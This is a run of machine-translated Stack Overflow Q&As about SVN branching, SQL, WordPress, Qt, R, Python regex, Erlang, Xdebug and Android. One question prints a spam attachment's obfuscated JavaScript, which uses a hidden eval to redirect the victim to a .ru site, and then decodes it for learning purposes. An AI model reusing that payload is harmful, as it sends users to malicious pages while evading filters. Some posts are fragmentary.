我正在尝试在我的公司内设置 SVN 方法。问题是，我想为我们的程序员创建一个简单的方法来完成他们的任务。我们在任务分配中工作，一个任务只修改我们代码库的一个子集，通常从我们存储库的各个部分获取对象（文件）。

我想做的是，找到一种在 SVN 中创建分支的方法（将其名称想象为来自错误跟踪器的任务代码），并且在该分支内只有与该任务相关的文件。

像这样：有一个巨大的文件夹结构来分隔系统的各个模块和部分，但我们将举一个小例子：文件夹 1、2 和 3，其中包含一些文件。
我们想从每个文件夹中获取一个文件，并在 /branches/task_1 中创建一个包含每个文件夹中的文件的分支。

我希望能够仅用三个文件签出该分支，并且仍然可以将更改合并回主干，而无需更改主干的其余部分。如果我们的开发人员没有太多工作，这是否可能？

编辑：代码主要是 SQL 和 PL/SQL 代码，所以没有要破坏的构建。请专注于我的要求，而不是传统的软件开发范式。

EDIT2：说服客户使用传统的 SVN 策略！赢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T19:59:56.107

不，这并不容易，这是正确的：这是一个可怕的策略。

SVN 旨在用作文件树的一系列快照。所以从树上摘樱桃到树枝上，然后尝试将它们合并回去会很乏味，尽管我认为这不是不可能的。另外，您必须查看测试每个任务中发生的情况......无论如何，这必须针对整个应用程序进行测试。所以按照你的要求去做是没有意义的。

现在，如果您的东西在设计上是模块化的，您可以将每个模块存储在单独的树或单独的 repo 中，然后将完整的应用程序维护为一系列 . `svn:externals`，但这实际上会使它变得更加复杂。我认为你可能会更好地以标准方式做事。

> 如果你不认为这是不可能的，你至少可以试着把我送到某个方向。

好吧，您将不得不从 CLI 工具创建分支，因为我不知道有任何客户端仅支持复制一组特定文件来创建分支（除非该组文件是存储库中特定目录的内容）。因此，您或开发人员必须执行以下操作：

`svn cp --parents SVNURL/trunk/file1.sql SVNURL/trunk/file2.sql SVNURL/branches/taskname`

问题是这只会从主干复制文件，而不是任何中间目录结构。因此，如果您在主干上只有平面文件布局，那么当您将所有内容合并回来时，您可能会感到困惑，因为进行合并的人只需要知道在哪里合并所有内容。

我能想到的唯一方法是单独复制每个文件，例如：

```
svn cp --parents SVNURL/trunk/file1.sql SVNURL/branches/taskname
svn cp --parents SVNURL/trunk/file2.sql SVNURL/branches/taskname
svn cp --parents SVNURL/trunk/migrations/file3.sql SVNURL/branches/taskname/migrations 
```

我猜它归结为，当你合并时，你将不得不一次做一个樱桃选择合并一个文件。这对我来说似乎是一大笔开销，但并没有太多好处。

在您解释了您在这里处理的内容和工作流程之后，我仍然认为这是一个坏主意。如果您将 TRUNK 复制到 BRANCH，然后只处理必要的文件，您将有一个更轻松的时间。只需查看日志就可以很容易地了解这些文件是什么。

如果您担心您的开发人员不小心修改了任务范围之外的内容，我很确定您可以将权限设置为仅授予他们对受任务影响的现有文件的提交访问权限+添加新文件的写入权限如有必要。

# mysql - Hive（或 MySQL）：查找具有最大时间戳的不同类型的事件

> ID：15232820
> 
> 赞同：1
> 
> 时间：2013-03-05T19:50:52.677
> 
> 标签：mysql, database, hive

我正在尝试编写一个配置单元查询，我对同一个表中的两个不同偶数类型之间的关系感兴趣。例如，假设我的表是这样构建的：

```
event_type     timestamp             source
completion     2013-03-04 12:00:55   NULL
completion     2013-03-04 11:55:55   NULL
impression     2013-03-04 11:53:45   A
impression     2013-03-04 11:57:55   A
impression     2013-03-04 11:58:00   B 
```

对于每次完成，我想获取最近一次展示的时间戳及其来源。例如，我希望从对上述示例的查询中得到的是：

```
completion_timestamp    most_recent_impression    source
2013-03-04 12:00:55     2013-03-04 11:58:00       B
2013-03-04 11:55:55     2013-03-04 11:53:45       A 
```

有小费吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T22:57:13.750

这依赖于时代的独特性。您可能应该添加一个 id 列来解决这个问题。

子查询获取每个完成时间 ( ) 和完成时间 ( )之前`GROUP BY c.ts`的最新展示时间( )。`MAX(i.ts)``i.ts < c.ts`

```
SELECT
  completionTime, impressionTime, s.source
FROM
(SELECT
  c.ts AS completionTime, MAX(i.ts) AS impressionTime
FROM t AS c
JOIN t AS i
WHERE c.event_type = 'completion'
AND i.event_type = 'impression'
AND i.ts < c.ts -- impressions happen before completions
GROUP BY c.ts) AS t2
JOIN t AS s ON s.ts = t2.impressionTime
ORDER BY completionTime DESC 
```

好的 ole [SQLFiddle](http://sqlfiddle.com/#!2/b65c3/18)

# wordpress - 动态替换 after Wordpress/Theme/Plugins generate ?

OK I have been doing lots of digging and trying to come up with the best solution and really would like some insight and help on this issue.

> ID：15232821
> 
> 赞同：1
> 
> 时间：2013-03-05T19:50:57.260
> 
> 标签：wordpress, replace, title, dynamically-generated, head

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T20:56:51.537

在调用*之前*尝试挂钩[wp_title](https://codex.wordpress.org/Plugin_API/Filter_Reference/wp_title)过滤器。*`get_header()`*

 *```
<?php 
add_filter( 'wp_title', 'my_tpl_wp_title', 100 );
function my_tpl_wp_title($title) {
    $title = 'My new cool title';

    return $title;
}
?> 
```

**编辑:)**我看到 Yoast 插件实际上篡改了我的解决方案:)

幸运的是，这是一个简单的修复。Yoast挂钩的优先级为 15，因此只需在您的函数`wp_title`上设置一个更高的数字即可。`wp_title`请参阅我的更新答案。

## Yoast 标题过滤器供参考

```
add_filter( 'wp_title', array( $this, 'title' ), 15, 3 ); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2017-02-16T21:37:11.747

如果您碰巧像我一样使用 Yoast SEO 插件，那么这最终对我有用。

```
function change_yoast_page_titles($title)
{
  global $pagename;
  $new_title=$title;
  if ($pagename=='widget')
  {
    global $widget_name;
    if (isset($widget_name))
        $new_title=$widget_name." | ".get_bloginfo('name'); 
  }
  return $new_title;
}

add_filter('wpseo_title','change_yoast_page_titles',100); 
```

信用在这里：[覆盖 Yoast SEO 插件页面标题和元描述](http://www.whatmarkdid.com/php/overriding-yoast-seo-plugin-page-title-meta-description/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-05-17T16:50:26.140

这是此问题的最终工作代码。上述响应非常有助于使此代码非常接近。由于这是在页面/脚本之间传递信息，因此需要一个全局变量。

```
$ddmsrealmitemname = $row_rsMainItemListing['Name'];

add_filter( 'wp_title', 'my_ddmseo_wp_title', 100);
function my_ddmseo_wp_title($title) {
    global $ddmsrealmitemname;
    $title = "{$ddmsrealmitemname} | Item Details | Dungeons and Dragons Online";
    return $title;
} 
```

此脚本现在扫描记录集中已选择的当前项目，并将其传递给 SEO 插件标题生成。

这似乎运作良好，并且是出于 SEO 原因而完成的，但 Google 似乎仍未将这些页面编入索引。无论如何，这是一个很好的小技巧，可以覆盖动态页面项目上的默认标题生成。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-06-16T14:13:41.823

自 Wordpress v4.4.0 以来，文档标题的生成方式发生了变化。现在`wp_get_document_title`规定如何生成标题：

```
/**
 * Displays title tag with content.
 *
 * @ignore
 * @since 4.1.0
 * @since 4.4.0 Improved title output replaced `wp_title()`.
 * @access private
 */
function _wp_render_title_tag() {
    if ( ! current_theme_supports( 'title-tag' ) ) {
        return;
    }

    echo '<title>' . wp_get_document_title() . '</title>' . "\n";
} 
```

这是来自 v5.4.2 的代码。以下是可用于操作标题标签的过滤器：

```
function wp_get_document_title() {
    /**
    * Filters the document title before it is generated.
    *
    * Passing a non-empty value will short-circuit wp_get_document_title(),
    * returning that value instead.
    *
    * @since 4.4.0
    *
    * @param string $title The document title. Default empty string.
    */
    $title = apply_filters( 'pre_get_document_title', '' );
    if ( ! empty( $title ) ) {
        return $title;
    }
    // --- snipped ---
    /**
    * Filters the separator for the document title.
    *
    * @since 4.4.0
    *
    * @param string $sep Document title separator. Default '-'.
    */
    $sep = apply_filters( 'document_title_separator', '-' );

    /**
    * Filters the parts of the document title.
    *
    * @since 4.4.0
    *
    * @param array $title {
    *     The document title parts.
    *
    *     @type string $title   Title of the viewed page.
    *     @type string $page    Optional. Page number if paginated.
    *     @type string $tagline Optional. Site description when on home page.
    *     @type string $site    Optional. Site title when not on home page.
    * }
    */
    $title = apply_filters( 'document_title_parts', $title );
    // --- snipped ---
    return $title;
} 
```

所以这里有两种方法可以做到。

第一个使用`pre_get_document_title`过滤器来缩短标题生成，因此如果您不打算对当前标题进行更改，则性能会更高：

```
function custom_document_title( $title ) {
    return 'Here is the new title';
}
add_filter( 'pre_get_document_title', 'custom_document_title', 10 ); 
```

第二种方式使用`document_title_separator`和`document_title_parts`钩子用于稍后在函数中执行的标题和标题分隔符，在使用类似`single_term_title`或`post_type_archive_title`取决于页面的函数生成标题并即将输出之后：

```
// Custom function should return a string
function custom_seperator( $sep ) {
   return '>';
}
add_filter( 'document_title_separator', 'custom_seperator', 10 );

// Custom function should return an array
function custom_html_title( $title ) {
   return array(
     'title' => 'Custom Title',
     'site'  => 'Custom Site'
    );
}
add_filter( 'document_title_parts', 'custom_html_title', 10 ); 
```*

# ubuntu-12.04 - 如何在 Ubuntu 12.04 上安装 qt quick 2？

> ID：15232824
> 
> 赞同：3
> 
> 时间：2013-03-05T19:51:05.057
> 
> 标签：ubuntu-12.04, qt5, qtquick2

我正在熟悉 qt5，我使用的是 Ubuntu 12.04。我设法安装了 qt5 和一些库，但我不知道如何安装新的 QtQuick。我正在使用“Canonical Qt5 Edgers”ppa。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-10-01T04:07:02.287

我也有“未安装 QtQuick 2.0”错误。我在网上找到的所有内容都引用了正确安装 Qt5 或某些子目录作为解决方案。但是我发现，即使我按照网上看到的说明通过命令行（apt-get）进行安装，我还是缺少**qtdeclarative5-qtquick2-plugin**，所以我从包管理器中获取了它（以及其他一些插件）我正在尝试的教程立即执行。因此，您可能想首先检查您是否拥有该插件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T20:45:40.483

[在 Ubuntu 12.04 和 12.10 上，我刚刚从Qt 项目下载页面](http://qt-project.org/downloads)执行了 .run 安装程序。

但是，如果您选择以 root 权限运行安装程序，您可能会遇到一些较小的文件权限问题。特别是，如果您使用 sudo 运行安装程序，安装完成后不要让它运行 Qt Creator。取消选中该选项，关闭向导，然后自己启动 Qt Creator。

# ruby-on-rails - 安装 redcar 导致 gem 问题。无效的 gemspec 和

> ID：15232827
> 
> 赞同：0
> 
> 时间：2013-03-05T19:51:16.023
> 
> 标签：ruby-on-rails, ruby, gem, bundler, redcar

我安装了 redcar，然后为我的 Mac 安装了 railsinstaller。我还使用更新了我的宝石，注意到事情变得毛茸茸的：`gem update --system` 我在输入时收到以下错误`rails -v`：

```
Invalid gemspec in [/Library/Ruby/Gems/1.8/specifications/redcar-0.13.gemspec]: Illformed requirement ["#<YAML::Syck::DefaultKey:0x10f332d08> 1.1.2"]
Invalid gemspec in [/Library/Ruby/Gems/1.8/specifications/redcar-0.13.gemspec]: Illformed requirement ["#<YAML::Syck::DefaultKey:0x10f332d08> 1.1.2"]
Latest version currently installed. Aborting. 
```

我该如何解决？我想安装导轨。

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T15:34:53.713

我不知道这是否能解决你的问题，但如果你卸载 redcar 可能会更好。在我看来，它是一个相当不错的编辑器，但是大约 11 个月没有更新，并且仍然[有一个未答复的请求请求修复 mac osx 下的错误](https://github.com/danlucraft/redcar/pull/16)。

（很抱歉将其发布为答案，但看来我还不能写评论。）

# r - R - 3 路表

> ID：15232829
> 
> 赞同：-1
> 
> 时间：2013-03-05T19:51:22.733
> 
> 标签：r

我有下表

```
Date   Visits  User
Feb1   10     1
Feb1   20     1
Feb1   100    2
Feb2   10     2
Feb3   34     6 
```

我正在尝试生成一个堆叠柱形图，其中 x 轴是日期，y 轴是访问次数，列按当天用户的访问次数堆叠。也就是说，对于 2 月 1 日，它应该显示一个 height=130 的列，其中它有两个部分，用户 2 为 100，用户 1 为 30。

我知道我应该生成一个这种形式的表格：

```
 1   2   6
Feb 1   30  100
Feb 2        10
Feb 3            34 
```

然后使用 barplot 函数。R 是否提供任何简单的函数来将第一个表格转换为第二个表格格式？任何帮助将不胜感激

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:58:23.697

`ggplot2`一种解决方案是为此任务使用包。

```
library(ggplot2)
#assuming that data frame is named df
ggplot(df,aes(Date,Visits,fill=factor(User)))+geom_bar(stat="identity") 
```

![在此处输入图像描述](../Images/d0c2f76a84980d3973209ee8e96f708b.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-09T06:55:59.320

要以您期望的形式获取数据，您可以使用`xtabs`：

```
> (temp <- xtabs(Visits ~ Date + User, SODF))
      User
Date     1   2   6
  Feb1  30 100   0
  Feb2   0  10   0
  Feb3   0   0  34 
```

您需要先*转置*此数据，然后才能将其用于`barplot`：

```
barplot(t(temp), legend = TRUE, 
        col = c("skyblue", "grey", "palegreen"), 
        xlab = "Date", ylab = "Visits") 
```

![在此处输入图像描述](../Images/e9bdf94e9ca0379f6dcfcec86189e012.png)

# python - 正则表达式：AttributeError：“NoneType”对象没有属性“组”

> ID：15232832
> 
> 赞同：26
> 
> 时间：2013-03-05T19:51:34.227
> 
> 标签：python, regex

我有一个字符串，我想提取其中的一个子集。这是一个更大的 Python 脚本的一部分。

这是字符串：

```
import re

htmlString = '</dd><dt> Fine, thank you.&#160;</dt><dd> Molt bé, gràcies. (<i>mohl behh, GRAH-syuhs</i>)' 
```

我想抽出“ *Molt bé, gràcies. mohl behh, GRAH-syuhs* ”。为此，我使用正则表达式`re.search`：

```
SearchStr = '(\<\/dd\>\<dt\>)+ ([\w+\,\.\s]+)([\&\#\d\;]+)(\<\/dt\>\<dd\>)+ ([\w\,\s\w\s\w\?\!\.]+) (\(\<i\>)([\w\s\,\-]+)(\<\/i\>\))'

Result = re.search(SearchStr, htmlString)

print Result.groups()
AttributeError: 'NoneType' object has no attribute 'groups' 
```

由于`Result.groups()`不起作用，我想做的提取（即`Result.group(5)`和`Result.group(7)`）也不起作用。但我不明白为什么我会收到这个错误？正则表达式在 TextWrangler 中有效，为什么在 Python 中无效？我是 Python 的初学者。

* * *

## 回答 #1

> 赞同：53
> 
> 时间：2013-03-05T20:20:44.693

你得到`AttributeError`是因为你在调用`groups`，`None`它没有任何方法。

`regex.search`返回`None`意味着正则表达式无法从提供的字符串中找到与模式匹配的任何内容。

使用正则表达式时，最好检查是否匹配：

```
Result = re.search(SearchStr, htmlString)

if Result:
    print Result.groups() 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2013-07-12T12:08:50.513

```
import re

htmlString = '</dd><dt> Fine, thank you.&#160;</dt><dd> Molt bé, gràcies. (<i>mohl behh, GRAH-syuhs</i>)'

SearchStr = '(\<\/dd\>\<dt\>)+ ([\w+\,\.\s]+)([\&\#\d\;]+)(\<\/dt\>\<dd\>)+ ([\w\,\s\w\s\w\?\!\.]+) (\(\<i\>)([\w\s\,\-]+)(\<\/i\>\))'

Result = re.search(SearchStr.decode('utf-8'), htmlString.decode('utf-8'), re.I | re.U)

print Result.groups() 
```

那样工作。该表达式包含非拉丁字符，因此通常会失败。您必须解码为 Unicode 并使用 re.U (Unicode) 标志。

我也是初学者，我自己也遇到过几次这个问题。

# sql - 在 FROM 子句中是否重复执行子查询

> ID：15232833
> 
> 赞同：0
> 
> 时间：2013-03-05T19:51:44.570
> 
> 标签：sql, oracle

FROM 子句中的子查询是对表 A 中的每条记录（检查）执行一次还是重复执行？

```
select tA.* 
from   tableA tA,
       (select myGetSingleIdFunction('asdfaf') id from dual) tB
where tA.id = tB.id; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T21:14:25.370

阅读这篇文章： [关于缓存和传播 SQL，作者：Tom Kyte](http://www.oracle.com/technetwork/issue-archive/2011/11-sep/o51asktom-453438.html)

这是答案：

```
select tA.* 
from   tableA tA
   where tA.id = (select myGetSingleIdFunction('asdfaf') from dual); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T20:01:02.743

一次。如果您有兴趣，可以查找[database cursors](http://msdn.microsoft.com/en-us/library/ms180169.aspx)，它以您担心的方式更多地遍历集合。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T19:59:24.563

如果查询计划器足够好，也不是。它会识别出您在子查询中使用了一个常量值，并且只使用该表来确定结果应该重复`dual`多少次。`tableA`

基本上把查询变成：

```
select tA.* 
from tableA tA
cross join dual
where tA.id = myGetSingleIdFunction('asdfaf') 
```

# command-line - 使用命令行 args 启动 erlang 有效，使用 args_file 无效

> ID：15232836
> 
> 赞同：1
> 
> 时间：2013-03-05T19:51:48.850
> 
> 标签：command-line, erlang, erl

我按照惊人的“如何在 10 分钟内使用 Erlang 创建 HTTP API”在 erlang 中构建了一个非常简单的小 OTP 应用程序：

[https://vimeo.com/59832641](https://vimeo.com/59832641)

当我使用命令行参数启动 erl 时，它可以完美运行，如视频中所示。但是，如果我尝试使用 -args_file 参数启动 erl，则应用程序不会启动。

args_file 非常简单；它只有一行，如下：

```
-pa deps/*/ebin ebin -s fancyapi_app 
```

...这是我尝试运行 erlang 时收到的错误报告：

```
=INFO REPORT==== 5-Mar-2013::19:32:59 ===
application: fancyapi
exited: {shutdown,{fancyapi_app,start,[normal,[]]}}
type: temporary 
```

有任何想法吗？是否`args_file FileName`会导致比仅使用常规命令行参数更多的事情发生？文档位于：

[http://www.erlang.org/doc/man/erl.html](http://www.erlang.org/doc/man/erl.html)

此外，我知道该命令在一定程度上是有效的，因为如果我添加`-sname node`到文本文件中，erl 提示符会显示`(node@localhost)1>`.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-05T21:26:02.253

使用`-emu_args`将显示发送到模拟器的确切参数的标志。这是一个简单的示例：

```
$ cat test.args 
-emu_args
-pa deps/*/ebin
-pa ebin
-name test@localhost 
```

现在我将手动传递所有这些参数：

```
$ erl -emu_args -pa deps/*/ebin -pa ebin -name test@localhost
Executing: /Users/abhinavsingh/Builds/R15B03/lib/erlang/erts-5.9.3.1/bin/beam.smp /Users/abhinavsingh/Builds/R15B03/lib/erlang/erts-5.9.3.1/bin/beam.smp -- -root /Users/abhinavsingh/Builds/R15B03/lib/erlang -progname erl -- -home /Users/abhinavsingh -- -pa deps/cowboy/ebin deps/jsx/ebin deps/lager/ebin deps/mimetypes/ebin deps/ranch/ebin -pa ebin -name test@localhost

Erlang R15B03 (erts-5.9.3.1) [source] [smp:8:8] [async-threads:0] [hipe] [kernel-poll:false]

Eshell V5.9.3.1  (abort with ^G)
(test@localhost)1> 
```

接下来通过 args 文件：

```
$ erl -args_file test.args 
Executing: /Users/abhinavsingh/Builds/R15B03/lib/erlang/erts-5.9.3.1/bin/beam.smp /Users/abhinavsingh/Builds/R15B03/lib/erlang/erts-5.9.3.1/bin/beam.smp -- -root /Users/abhinavsingh/Builds/R15B03/lib/erlang -progname erl -- -home /Users/abhinavsingh -- -pa deps/*/ebin -pa ebin -name test@localhost

Erlang R15B03 (erts-5.9.3.1) [source] [smp:8:8] [async-threads:0] [hipe] [kernel-poll:false]

Eshell V5.9.3.1  (abort with ^G)
(test@localhost)1> 
```

如您所见，两者实际上并不相同。具体来说，虽然所有这些都手动`-pa deps/*/ebin`扩展为`-pa deps/cowboy/ebin deps/jsx/ebin ...`，但是当您通过 args 文件传递​​它时，同样的情况不会很好。结果，某些模块不在您的代码路径中，因此应用程序无法启动。

# bash - ShellScript 同步两个文件夹

> ID：15232838
> 
> 赞同：-2
> 
> 时间：2013-03-05T19:51:50.623
> 
> 标签：bash, shell

嘿伙计们，我对这整个 bash 事情很陌生。我正在尝试编写一个同步两个文件夹的 shell 脚本。所以理论上我必须将文件夹一中的所有文件列出到一个数组中，并检查文件夹 b 中的文件是否存在。如果不是 cp $file 进入文件夹 b。

```
#!/bin/bash
FILES="`/PATH/TO/ALL/FILES`"
function generateList {
    for file in "$FILES"
    do
        echo "$file"
    done

} 
```

所以也许你知道一个很好的教程来教授基础知识。:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T19:55:26.927

研究使用 rsync。

`man rsync`如果不满足您的文档需求，此链接似乎包含可以帮助您的信息：

[http://www.maclife.com/article/howtos/using_rsync_keep_your_files_sync_0](http://www.maclife.com/article/howtos/using_rsync_keep_your_files_sync_0)

# java - 在 For 循环中休眠

> ID：15232843
> 
> 赞同：1
> 
> 时间：2013-03-05T19:52:13.817
> 
> 标签：java, android, sleep

我正在开发一个简单的游戏。`for`我希望在单击按钮时执行的循环的每个交互中都有一小段等待。

我曾尝试使用`Thread.sleep(2000)`，但无济于事。

这是按钮单击的代码：

```
public void playClick(View v) {
        String item;
        try{
            final Handler handler = new Handler();
        for (int i = 0; i < stringList.size(); i++) {

             Thread.sleep(2000);
            item = stringList.get(i);

            if(item.equals("left")){

                leftclick();

            }else if(item.equals("right")){

                rightClick();

            }else if(item.equals("up")){

                upClick();

            }else if(item.equals("down")){

                downClick();

            }
        }
        }catch(Exception e){
            Toast.makeText(this, ""+e.toString(), Toast.LENGTH_SHORT).show();
        } 
```

我想在每次执行`for`循环时等待。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-05T19:54:49.260

不建议阻塞主线程，相反我建议创建一个 Runnable 并将其传递给您现有的、未使用的 Handler。也许：

```
private final Handler handler = new Handler();
private final Runnable runnable = new Runnable() {
    @Override
    public void run() {
        for (String item : stringList) {
            if(item.equals("left")){
                leftclick();
            }else if(item.equals("right")){
                rightClick();
            }else if(item.equals("up")){
                upClick();
            }else if(item.equals("down")){
                downClick();
            }
        }
    }
}

...

public void playClick(View v) {
    // Execute the code inside runnable in 2 seconds
    handler.postDelayed(runnable, 2000);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T20:10:22.857

@Sam 解决方案的替代方法是使用 javax.swing。[定时器](http://docs.oracle.com/javase/7/docs/api/javax/swing/Timer.html)。

# php - Xdebug 和 PHP 无法在我的服务器上运行

> ID：15232848
> 
> 赞同：4
> 
> 时间：2013-03-05T19:52:36.313
> 
> 标签：php, linux, apache, lamp, xdebug

我已经多次配置了 xdebug 和 php，但是回顾我的旧笔记，无法帮助我重新配置它。

我做了以下事情：

1.  已安装`LAMP`
2.  已安装`php5-xdebug`
3.  重启阿帕奇`sudo /etc/init.d/apache2 restart`
4.  现在`/etc/php5/apache2/conf.d/xdebug.ini`看起来像这样：

*xdebug.ini*

```
zend_extension=/usr/lib/php5/20090626+lfs/xdebug.so
xdebug.remote_enable=On
xdebug.remote_enable=1
xdebug.remote_host="localhost"
xdebug.remote_port=9000
xdebug.remote_handler="dbgp" 
```

我创建了一个仅包含的 php 文件，`phpinfo();`当我在浏览器中加载该页面时，我没有像往常一样获得包含所有 xdebug 详细信息的 xdebug 部分

```
xdebug.collect
xdebug.dump
xdebug.profiler 
```

等等等等

这一次我有什么没做错的？

```
The OS is Ubuntu 12.04
PHP version is 5.3.10
Apache version is 2.2.22
Xdebug version is 2.1.0-1 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-05T20:01:05.857

我将执行以下步骤：

*   验证 .so 文件是否确实存在于该路径（复制/粘贴和`ls`）
*   使用 的输出`phpinfo()`告诉您正在解析哪些 .ini 文件，是否包含您的？目录是否`apache2/*.ini`包括在内？
*   检查 apache 错误日志以了解重启时可能发生的任何错误

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-03-02T15:14:29.050

在我从 PHP 5.3 更新到 5.5 之后，我看到了这个错误：

> 加载/usr/lib/php5/20090626+lfs/xdebug.so 失败：/usr/lib/php5/20090626+lfs/xdebug.so：无法打开共享对象文件：没有这样的文件或目录

为了修复，我将路径更改为 xdebug.so

> /etc/php5/apache2/conf.d/20-xdebug.ini

从

> /usr/lib/php5/20090626+lfs/xdebug.so

到

> /usr/lib/php5/20121212/xdebug.so

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-12-30T07:44:18.020

执行 sudo find / -name 'xdebug.so'

并将此文件的位置复制到 xdebug.ini 和 php.ini 文件中

# javascript - Javascript - 混淆 - 向坏人学习

> ID：15232851
> 
> 赞同：3
> 
> 时间：2013-03-05T19:52:49.800
> 
> 标签：javascript

今天早上我收到了一些垃圾邮件。我注意到附件是一个 .html 文件。我没有将其丢弃，而是将其作为学习机会，并将其复制到我的桌面并将其重命名为 .txt 并将其加载到记事本中。

这是垃圾邮件附件中出现的 html + 混淆脚本：

```
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Please wait</title>
</head>
<body>  
<h1><b>Please wait. You will be forwarded.. . </h1></b>
<h4>Internet Explorer / Mozilla Firefox compatible only</h4><br>

<script>asgq=    [0x76,0x61,0x72,0x31,0x3d,0x34,0x39,0x3b,0xa,0x76,0x61,0x72,0x32,0x3d,0x76,0x61,0x72,0x31,0x3b,0xa,0x69,0x66,0x28,0x76,0x61,0x72,0x31,0x3d,0x3d,0x76,0x61,0x72,0x32,0x29,0x20,0x7b,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x6c,0x6f,0x63,0x61,0x74,0x69,0x6f,0x6e,0x3d,0x22,0x68,0x74,0x74,0x70,0x3a,0x2f,0x2f,0x67,0x69,0x6c,0x69,0x61,0x6f,0x6e,0x73,0x6f,0x2e,0x72,0x75,0x3a,0x38,0x30,0x38,0x30,0x2f,0x66,0x6f,0x72,0x75,0x6d,0x2f,0x6c,0x69,0x6e,0x6b,0x73,0x2f,0x63,0x6f,0x6c,0x75,0x6d,0x6e,0x2e,0x70,0x68,0x70,0x22,0x3b,0x7d];try{document.body&=0.1}catch(gdsgsdg){zz=3;dbshre=56;if(dbshre){vfvwe=0;    try{}catch(agdsg){vfvwe=1;}if(!vfvwe){e=window["e".concat("val")];}
 s="";for(i=0;i-105!=0;i++){if(window.document)s+=String.fromCharCode(asgq[i]);}
 z=s;e(s);}}</script>
</body>
</html> 
```

我做的第一件事是将它排成一行，使其更具可读性：

```
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Please wait</title>
</head>
<body>  
<h1><b>Please wait. You will be forwarded.. . </h1></b>
<h4>Internet Explorer / Mozilla Firefox compatible only</h4><br>

<script>
asgq=[0x76,0x61,0x72,0x31,0x3d,0x34,0x39,0x3b,0xa,0x76,0x61,0x72,0x32,0x3d,0x76,0x61,0x72,0x31,0x3b,0xa,0x69,0x66,0x28,0x76,0x61,0x72,0x31,0x3d,0x3d,0x76,0x61,0x72,0x32,0x29,0x20,0x7b,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x6c,0x6f,0x63,0x61,0x74,0x69,0x6f,0x6e,0x3d,0x22,0x68,0x74,0x74,0x70,0x3a,0x2f,0x2f,0x67,0x69,0x6c,0x69,0x61,0x6f,0x6e,0x73,0x6f,0x2e,0x72,0x75,0x3a,0x38,0x30,0x38,0x30,0x2f,0x66,0x6f,0x72,0x75,0x6d,0x2f,0x6c,0x69,0x6e,0x6b,0x73,0x2f,0x63,0x6f,0x6c,0x75,0x6d,0x6e,0x2e,0x70,0x68,0x70,0x22,0x3b,0x7d];
try{document.body&=0.1} 
catch(gdsgsdg) 
{
 zz=3;
 dbshre=56;
   if(dbshre){
     vfvwe=0;
     try{}
     catch(agdsg)
     {vfvwe=1;}
     if(!vfvwe){
     e=window["e".concat("val")];
     s="";

   for(i=0;i-105!=0;i++){
     if(window.document)
        s+=String.fromCharCode(asgq[i]);
   }
z=s;
e(s);
    }  
   }
</script>
</body>
</html> 
```

在这一点上，很明显脚本作者将好东西隐藏在 asgq 数组中作为字符代码。0x76 = "v", 0x61 = "a", 0x72 = "r" 等等...嗯，前 3 个元素已经拼出了 "var"！

asgq.length = 105。在 for 循环中，作者使用的结束条件是“i-105！=0”，这是一种令人困惑的说法 i < asgq.length。“zz=3；” 似乎什么都不做/不参与脚本的其余部分。在第一个 catch 语句之后还有一个不匹配的“{”。

我运行了 for 循环并将数组解压缩到一个警告框中。这是我得到的：

" var1=49; var2=var1; if(var1==var2) {document.location="http://giliaonso.ru:8080/forum/links/column.php";} "

所以作者正在经历用字符代码制作49 = 49的麻烦，如果49 = 49，那么window.location = russian site。

我的问题：

1.  作者正在使用尝试缓存语句。第一个尝试条件是（document.body&=0.1）。这是设计为失败并继续到语句的缓存部分还是这是一些按位操作？如果它是按位的，为什么“= 0.1”？

2.  第一个缓存正在传递“agdsg”。我只见过“e”通过的缓存（e）。传递除 e 之外的任何值有什么作用？

3.  “e=window["e".concat("val")];" 这行到底是什么 正在做？我似乎在充当作者后来调用的函数声明：“e(s);” "s" 是解压后的数组。

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T20:03:36.897

1）这会尝试分配`0`哪个`document.body`会引发错误：

```
document.body&=0.1
//is the same as
document.body = document.body & 0.1;
//document.body & *anything* returns 0 
```

2)`catch`以可变名称作为参数，您可以随意命名（包括`agdsg`.

3）让我们分解一下：

```
e=window["e".concat("val")];
//"e".concat("val") returns "eval"
e=window["eval"]
//which gives you the global "eval()" function 
```

基本上，作者将该数组解码为要执行的代码字符串，然后使用`eval()`它来运行它。他们不只是使用的原因`eval("var ...")`是因为混淆 eval 关闭（以及字符串）使得过滤器（或人类）更难看到它正在运行 eval。如果它知道它正在运行 eval，它可能会检查字符串并停止重定向代码。

# ruby - 乘客：无法加载此类文件 ruby gems/builder

> ID：15232856
> 
> 赞同：22
> 
> 时间：2013-03-05T19:53:00.603
> 
> 标签：ruby, apache, passenger

我试图用 Apache2 和 ruby​​ 2.0 安装乘客，当我这样做时我遇到了这行错误：

```
passenger-install-apache2-module 
```

错误：

```
--------------------------------------------
Compiling and installing Apache 2 module...
cd /usr/local/lib/ruby/gems/2.0.0/gems/passenger-3.0.19
